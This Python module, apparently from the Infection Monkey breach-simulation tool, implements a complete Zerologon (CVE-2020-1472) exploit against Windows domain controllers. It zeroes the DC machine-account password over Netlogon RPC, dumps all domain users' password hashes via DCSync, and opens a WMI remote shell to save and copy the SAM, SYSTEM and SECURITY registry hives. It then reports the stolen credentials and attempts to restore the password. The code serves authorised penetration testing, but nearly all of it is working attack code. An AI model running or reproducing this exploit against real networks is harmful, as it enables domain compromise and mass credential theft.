"""
Zerologon, CVE-2020-1472
Implementation based on https://github.com/dirkjanm/CVE-2020-1472/ and
https://github.com/risksense/zerologon/.
"""

import logging
import os
import re
import tempfile
from binascii import unhexlify
from typing import Dict, List, Optional, Sequence, Tuple

import impacket
from impacket.dcerpc.v5 import epm, nrpc, rpcrt, transport
from impacket.dcerpc.v5.dtypes import NULL

from common.agent_events import CredentialsStolenEvent
from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
from common.credentials import Credentials, LMHash, NTHash, Username
from common.tags import (
    T1003_ATTACK_TECHNIQUE_TAG,
    T1098_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.wmi_tools import WmiTools
from infection_monkey.exploit.zerologon_utils.dump_secrets import DumpSecrets
from infection_monkey.exploit.zerologon_utils.options import OptionsForSecretsdump
from infection_monkey.exploit.zerologon_utils.vuln_assessment import get_dc_details, is_exploitable
from infection_monkey.exploit.zerologon_utils.wmiexec import Wmiexec
from infection_monkey.i_puppet import ExploiterResultData
from infection_monkey.utils.capture_output import StdoutCapture
from infection_monkey.utils.ids import get_agent_id
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)

ZEROLOGON_EXPLOITER_TAG = "zerologon-exploiter"

EXPLOIT_TAGS = (
    ZEROLOGON_EXPLOITER_TAG,
    T1003_ATTACK_TECHNIQUE_TAG,
    T1098_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
)
CREDENTIALS_STOLEN_EVENT_TAGS = frozenset(
    {
        ZEROLOGON_EXPLOITER_TAG,
        T1003_ATTACK_TECHNIQUE_TAG,
        T1098_ATTACK_TECHNIQUE_TAG,
    }
)


class ZerologonExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "Netlogon"
    MAX_ATTEMPTS = 2000  # For 2000, expected average number of attempts needed: 256.
    ERROR_CODE_ACCESS_DENIED = 0xC0000022

    def __init__(self):
        super().__init__()
        self.exploit_info["password_restored"] = None
        self._extracted_creds = {}
        self._secrets_dir = tempfile.TemporaryDirectory(prefix="zerologon")

    def __del__(self):
        self._secrets_dir.cleanup()

    @WmiTools.impacket_user
    def _exploit_host(self) -> ExploiterResultData:
        self.dc_ip, self.dc_name, self.dc_handle = get_dc_details(self.host)

        can_exploit, rpc_con = is_exploitable(self)
        if can_exploit:
            logger.info("Target vulnerable, changing account password to empty string.")

            if self._is_interrupted():
                self._set_interrupted()
                return self.exploit_result

            # Start exploiting attempts.
            logger.debug("Attempting exploit.")
            _exploited = self._send_exploit_rpc_login_requests(rpc_con)

            rpc_con.disconnect()  # type: ignore[union-attr]

        else:
            logger.info(
                "Exploit not attempted. Target is most likely patched, or an error was "
                "encountered."
            )
            return self.exploit_result

        # Restore DC's original password.
        if _exploited:
            self.exploit_result.propagation_success = False
            self.exploit_result.exploitation_success = _exploited
            if self.restore_password():
                self.exploit_info["password_restored"] = True
                logger.info("System exploited and password restored successfully.")
            else:
                self.exploit_info["password_restored"] = False
                logger.info("System exploited but couldn't restore password!")

            self.store_extracted_creds_for_exploitation()
        else:
            logger.info("System was not exploited.")

        return self.exploit_result

    @staticmethod
    def connect_to_dc(dc_ip) -> object:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol="ncacn_ip_tcp")
        rpc_transport = transport.DCERPCTransportFactory(binding)
        rpc_transport.set_connect_timeout(LONG_REQUEST_TIMEOUT)
        rpc_con = rpc_transport.get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
        return rpc_con

    def _send_exploit_rpc_login_requests(self, rpc_con) -> bool:
        for _ in interruptible_iter(range(0, self.MAX_ATTEMPTS), self.interrupt):
            exploit_attempt_result = self.try_exploit_attempt(rpc_con)

            is_exploited = self.assess_exploit_attempt_result(exploit_attempt_result)
            if is_exploited:
                return True

        return False

    def try_exploit_attempt(self, rpc_con) -> Optional[object]:
        error_message = ""
        try:
            exploit_attempt_result = self.attempt_exploit(rpc_con)
            return exploit_attempt_result
        except nrpc.DCERPCSessionError as err:
            # Failure should be due to a STATUS_ACCESS_DENIED error.
            # Otherwise, the attack is probably not working.
            if err.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                error_message = f"Unexpected error code from DC: {err.get_error_code()}"
                logger.info(error_message)
        except BaseException as err:
            error_message = f"Unexpected error: {err}"
            logger.info(error_message)

        self._publish_exploitation_event(
            target=self.host.ip_addr,
            exploitation_success=False,
            tags=EXPLOIT_TAGS,
            error_message=error_message,
        )

        return None

    def attempt_exploit(self, rpc_con: rpcrt.DCERPC_v5) -> object:
        request = nrpc.NetrServerPasswordSet2()
        ZerologonExploiter._set_up_request(request, self.dc_name)
        request["PrimaryName"] = self.dc_handle + "\x00"
        request["ClearNewPassword"] = b"\x00" * 516

        return rpc_con.request(request)

    @staticmethod
    def _set_up_request(request: nrpc.NetrServerPasswordSet2, dc_name: str) -> None:
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = b"\x00" * 8
        authenticator["Timestamp"] = b"\x00" * 4

        request["AccountName"] = dc_name + "$\x00"
        request["ComputerName"] = dc_name + "\x00"
        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request["Authenticator"] = authenticator

    def assess_exploit_attempt_result(self, exploit_attempt_result) -> bool:
        if exploit_attempt_result:
            if exploit_attempt_result["ErrorCode"] == 0:
                self.report_login_attempt(result=True, user=self.dc_name)
                _exploited = True
                logger.info("Exploit complete!")

                self._publish_exploitation_event(
                    target=self.host.ip_addr, exploitation_success=True, tags=EXPLOIT_TAGS
                )
            else:
                self.report_login_attempt(result=False, user=self.dc_name)
                _exploited = False
                error_message = f"Non-zero return code: {exploit_attempt_result['ErrorCode']}."
                "Something went wrong."
                logger.info(error_message)

                self._publish_exploitation_event(
                    target=self.host.ip_addr,
                    exploitation_success=False,
                    tags=EXPLOIT_TAGS,
                    error_message=error_message,
                )
            return _exploited

        return False

    def restore_password(self) -> bool:
        logger.info("Restoring original password...")

        try:
            rpc_con = None

            # DCSync to get usernames and their passwords' hashes.
            logger.debug("DCSync; getting usernames and their passwords' hashes.")
            user_creds = self.get_all_user_creds()
            if not user_creds:
                raise Exception("Couldn't extract any usernames and/or their passwords' hashes.")

            # Use above extracted credentials to get original DC password's hashes.
            logger.debug("Getting original DC password's NT hash.")
            original_pwd_nthash = None
            for user_details in user_creds:
                username = user_details[0]
                user_pwd_hashes = [
                    user_details[1]["lm_hash"],
                    user_details[1]["nt_hash"],
                ]
                try:
                    original_pwd_nthash = self.get_original_pwd_nthash(username, user_pwd_hashes)
                    if original_pwd_nthash:
                        break
                except Exception as e:
                    logger.info(f"Credentials didn't work. Exception: {str(e)}")

            if not original_pwd_nthash:
                raise Exception("Couldn't extract original DC password's NT hash.")

            # Connect to the DC's Netlogon service.
            try:
                rpc_con = ZerologonExploiter.connect_to_dc(self.dc_ip)
            except Exception as e:
                logger.info(f"Exception occurred while connecting to DC: {str(e)}")
                return False

            # Start restoration attempts.
            logger.debug("Attempting password restoration.")
            _restored = self._send_restoration_rpc_login_requests(rpc_con, original_pwd_nthash)
            if not _restored:
                raise Exception("Failed to restore password! Max attempts exceeded?")

            return _restored

        except Exception as e:
            logger.error(e)
            return False

        finally:
            if rpc_con:
                rpc_con.disconnect()  # type: ignore[attr-defined]

    def get_all_user_creds(self) -> Optional[List[Tuple[str, Dict]]]:
        try:
            options = OptionsForSecretsdump(
                # format for DC account - "NetBIOSName$@0.0.0.0"
                target=f"{self.dc_name}$@{self.dc_ip}",
                target_ip=self.dc_ip,
                dc_ip=self.dc_ip,
            )

            dumped_secrets = self.get_dumped_secrets(
                remote_name=self.dc_ip, username=f"{self.dc_name}$", options=options
            )

            self._extract_user_creds_from_secrets(dumped_secrets=dumped_secrets)

            creds_to_use_for_getting_original_pwd_hashes: List[Tuple[str, Dict]] = []
            admin = "Administrator"
            for user in self._extracted_creds.keys():
                if user == admin:  # most likely to work so try this first
                    creds_to_use_for_getting_original_pwd_hashes.insert(
                        0, (user, self._extracted_creds[user])
                    )
                else:
                    creds_to_use_for_getting_original_pwd_hashes.append(
                        (user, self._extracted_creds[user])
                    )

            return creds_to_use_for_getting_original_pwd_hashes

        except Exception as e:
            logger.info(
                f"Exception occurred while dumping secrets to get some username and its "
                f"password's NT hash: {str(e)}"
            )

        return None

    def get_dumped_secrets(
        self,
        remote_name: str = "",
        username: str = "",
        options: Optional[object] = None,
    ) -> List[str]:
        dumper = DumpSecrets(remote_name=remote_name, username=username, options=options)
        dumped_secrets = dumper.dump().split("\n")
        return dumped_secrets

    def _extract_user_creds_from_secrets(self, dumped_secrets: List[str]) -> None:
        # format of secret we're looking for - "domain\uid:rid:lmhash:nthash:::"
        re_phrase = r"([\S]*[:][0-9]*[:][a-zA-Z0-9]*[:][a-zA-Z0-9]*[:][:][:])"

        for line in dumped_secrets:
            secret = re.fullmatch(pattern=re_phrase, string=line)
            if secret:
                parts_of_secret = secret[0].split(":")
                user = parts_of_secret[0].split("\\")[-1]  # we don't want the domain
                user_RID, lmhash, nthash = parts_of_secret[1:4]

                self._extracted_creds[user] = {
                    "RID": int(user_RID),  # relative identifier
                    "lm_hash": lmhash,
                    "nt_hash": nthash,
                }

    def store_extracted_creds_for_exploitation(self) -> None:
        for user in self._extracted_creds.keys():
            self.send_extracted_creds_as_credential_telemetry(
                user,
                self._extracted_creds[user]["lm_hash"],
                self._extracted_creds[user]["nt_hash"],
            )

    def send_extracted_creds_as_credential_telemetry(
        self, user: str, lmhash: str, nthash: str
    ) -> None:
        extracted_credentials = [
            Credentials(identity=Username(username=user), secret=LMHash(lm_hash=lmhash)),
            Credentials(identity=Username(username=user), secret=NTHash(nt_hash=nthash)),
        ]

        self._publish_credentials_stolen_event(extracted_credentials)

    def _publish_credentials_stolen_event(
        self, extracted_credentials: Sequence[Credentials]
    ) -> None:
        credentials_stolen_event = CredentialsStolenEvent(
            source=get_agent_id(),
            tags=CREDENTIALS_STOLEN_EVENT_TAGS,
            stolen_credentials=extracted_credentials,
        )
        self.agent_event_queue.publish(credentials_stolen_event)

    def get_original_pwd_nthash(self, username: str, user_pwd_hashes: List[str]) -> Optional[str]:
        if not self.save_HKLM_keys_locally(username, user_pwd_hashes):
            return None

        try:
            options = OptionsForSecretsdump(
                dc_ip=self.dc_ip,
                just_dc=False,
                system=os.path.join(self._secrets_dir.name, "monkey-system.save"),
                sam=os.path.join(self._secrets_dir.name, "monkey-sam.save"),
                security=os.path.join(self._secrets_dir.name, "monkey-security.save"),
            )

            dumped_secrets = self.get_dumped_secrets(remote_name="LOCAL", options=options)
            for secret in dumped_secrets:
                if "$MACHINE.ACC: " in secret:  # format of secret - "$MACHINE.ACC: lmhash:nthash"
                    nthash = secret.split(":")[2]
                    return nthash

        except Exception as e:
            logger.info(
                f"Exception occurred while dumping secrets to get original DC password's NT "
                f"hash: {str(e)}"
            )

        finally:
            self.remove_locally_saved_HKLM_keys()

        return None

    def save_HKLM_keys_locally(self, username: str, user_pwd_hashes: List[str]) -> bool:
        logger.info(f"Starting remote shell on victim with user: {username}")

        wmiexec = Wmiexec(
            ip=self.dc_ip,
            username=username,
            hashes=":".join(user_pwd_hashes),
            domain=self.dc_ip,
            secrets_dir=self._secrets_dir,
        )

        remote_shell = wmiexec.get_remote_shell()
        if remote_shell:
            with StdoutCapture() as output_captor:
                try:
                    # Save HKLM keys on victim.
                    remote_shell.onecmd(
                        "reg save HKLM\\SYSTEM system.save && "
                        + "reg save HKLM\\SAM sam.save && "
                        + "reg save HKLM\\SECURITY security.save"
                    )

                    # Get HKLM keys locally (can't run these together because it needs to call
                    # do_get()).
                    remote_shell.onecmd("get system.save")
                    remote_shell.onecmd("get sam.save")
                    remote_shell.onecmd("get security.save")

                    # Delete saved keys on victim.
                    remote_shell.onecmd("del /f system.save sam.save security.save")

                    wmiexec.close()

                    return True

                except Exception as e:
                    logger.info(f"Exception occurred: {str(e)}")

                finally:
                    info = output_captor.get_captured_stdout_output()
                    logger.debug(f"Getting victim HKLM keys via remote shell: {info}")

        else:
            raise Exception("Could not start remote shell on DC.")

        return False

    def remove_locally_saved_HKLM_keys(self) -> None:
        for name in ["system", "sam", "security"]:
            path = os.path.join(self._secrets_dir.name, f"monkey-{name}.save")
            try:
                os.remove(path)
            except Exception as e:
                logger.info(f"Exception occurred while removing file {path} from system: {str(e)}")

    def _send_restoration_rpc_login_requests(self, rpc_con, original_pwd_nthash) -> bool:
        for _ in interruptible_iter(range(0, self.MAX_ATTEMPTS), self.interrupt):
            restoration_attempt_result = self.try_restoration_attempt(rpc_con, original_pwd_nthash)

            is_restored = self.assess_restoration_attempt_result(restoration_attempt_result)
            if is_restored:
                return is_restored

        return False

    def try_restoration_attempt(
        self, rpc_con: rpcrt.DCERPC_v5, original_pwd_nthash: str
    ) -> Optional[object]:
        try:
            restoration_attempt_result = self.attempt_restoration(rpc_con, original_pwd_nthash)
            return restoration_attempt_result
        except nrpc.DCERPCSessionError as e:
            # Failure should be due to a STATUS_ACCESS_DENIED error.
            # Otherwise, the attack is probably not working.
            if e.get_error_code() != self.ERROR_CODE_ACCESS_DENIED:
                logger.info(f"Unexpected error code from DC: {e.get_error_code()}")
        except BaseException as e:
            logger.info(f"Unexpected error: {e}")

        return False

    def attempt_restoration(
        self, rpc_con: rpcrt.DCERPC_v5, original_pwd_nthash: str
    ) -> Optional[object]:
        plaintext = b"\x00" * 8
        ciphertext = b"\x00" * 8
        flags = 0x212FFFFF

        # Send challenge and authentication request.
        server_challenge_response = nrpc.hNetrServerReqChallenge(
            rpc_con, self.dc_handle + "\x00", self.dc_name + "\x00", plaintext
        )
        server_challenge = server_challenge_response["ServerChallenge"]

        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            self.dc_handle + "\x00",
            self.dc_name + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            self.dc_name + "\x00",
            ciphertext,
            flags,
        )

        assert server_auth["ErrorCode"] == 0
        session_key = nrpc.ComputeSessionKeyAES(
            None,
            b"\x00" * 8,
            server_challenge,
            unhexlify("31d6cfe0d16ae931b73c59d7e0c089c0"),
        )

        try:
            nrpc.NetrServerPasswordSetResponse = NetrServerPasswordSetResponse
            nrpc.OPNUMS[6] = (NetrServerPasswordSet, nrpc.NetrServerPasswordSetResponse)

            request = NetrServerPasswordSet()
            ZerologonExploiter._set_up_request(request, self.dc_name)
            request["PrimaryName"] = NULL
            pwd_data = impacket.crypto.SamEncryptNTLMHash(
                unhexlify(original_pwd_nthash), session_key
            )
            request["UasNewPassword"] = pwd_data

            rpc_con.request(request)

        except Exception as e:
            logger.info(f"Unexpected error: {e}")

        return rpc_con

    def assess_restoration_attempt_result(self, restoration_attempt_result) -> bool:
        if restoration_attempt_result:
            logger.debug("DC machine account password should be restored to its original value.")
            return True

        return False


class NetrServerPasswordSet(nrpc.NDRCALL):
    opnum = 6
    structure = (
        ("PrimaryName", nrpc.PLOGONSRV_HANDLE),
        ("AccountName", nrpc.WSTR),
        ("SecureChannelType", nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
        ("ComputerName", nrpc.WSTR),
        ("Authenticator", nrpc.NETLOGON_AUTHENTICATOR),
        ("UasNewPassword", nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )


class NetrServerPasswordSetResponse(nrpc.NDRCALL):
    structure = (
        ("ReturnAuthenticator", nrpc.NETLOGON_AUTHENTICATOR),
        ("ErrorCode", nrpc.NTSTATUS),
    )
